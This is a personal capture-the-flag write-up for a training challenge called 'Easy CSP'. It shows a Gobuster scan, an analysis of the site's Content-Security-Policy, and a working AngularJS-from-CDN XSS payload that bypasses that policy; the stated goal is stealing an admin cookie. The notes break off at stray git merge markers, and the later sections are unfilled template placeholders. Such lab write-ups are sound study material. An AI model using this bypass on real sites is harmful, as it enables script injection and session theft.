---
tags:
  - 🚩
up:
  - "[[02 - (incomplete) Data Exfiltration]]"
platform: BKSEC Training
difficulty: Easy
creation_date: 2026-02-23
last_modified: 2026-02-23
---

# 🚩 [[BKSEC - Easy CSP]]
**Primary:** [[01 - Web Security]]

**Secondary:** [[02 - (incomplete) Data Exfiltration]]

**Related Techniques:** [[(incomplete) CSP (Content Security Policy) Bypass]]

**Related Tools:**  


## Executive Summary
* **IP:** `http://103.77.175.40:8222/`
* **Key Technique:** CSP bypass into admin cookie exfiltration
* **Status:** Completed`

---

## Reconnaissance
### Gobuster Scan
```bash
**Gobuster-Target**:: 103.77.175.40:8222 **Scan-Output**::
>>>>>>> b2c6949 (Date: 2026-02-23 09:36:47)
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://103.77.175.40:8222/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Downloads/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 320]
Progress: 17769 / 17769 (100.00%)
===============================================================
Finished
===============================================================
```

There is a forbidden directory that might be our target.

---
### The Content-Security-Policy
The website was a website vulnerable to XSS as the input containing HTML tags were directly pasted into the page without escaping or sanitization.

![[Pasted image 20260223090507.png]]

Since the name of the challenge is **Easy CSP**, I figure I should take a look at the traffic:

![[Pasted image 20260223091133.png]]

**Content-Security-Policy:**
- default-src 'self': Fallback to `'self` if not mentioned in CSP
- **script-src 'self' [https://cdnjs.cloudflare.com](https://cdnjs.cloudflare.com/):** Allow script loaded from `'self'` or from the CloudFlare CDN.
- **style-src 'self' 'unsafe-inline' [https://fonts.googleapis.com](https://fonts.googleapis.com/):** Allow inline script and style script from `'self'`
- font-src 'self' [https://fonts.gstatic.com](https://fonts.gstatic.com/): Font source from `'self'` 
- **img-src 'self' data:* ** Allow image to be loaded from anywhere.

## CSP Bypass

I input the whole CSP header into https://cspbypass.com/ and got the payload:

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script>
<div ng-app>
	<img src=x ng-on-error="
		window = $event.target.ownerDocument.defaultView;
		window.alert(window.origin);
	">
</div>
```

The input worked:

![[Pasted image 20260223092700.png]]

Since `script-src` 
>>>>>>> b2c6949 (Date: 2026-02-23 09:36:47)

---

## Privilege Escalation (Root)

**Current User:** `www-data`

### Enumeration

- **LinPeas Findings:** `Vulnerable Sudo version`
    

### Exploitation

Bash

```
# Commands to get root
```

---

## Loot & Flags

- [ ] **User Flag:** `hash_here`
    
- [ ] **Root Flag:** `hash_here`
    
- [ ] **Credentials:**
    
    - `user:password`
        

---

**References:** [Link](https://www.google.com/search?q=url)
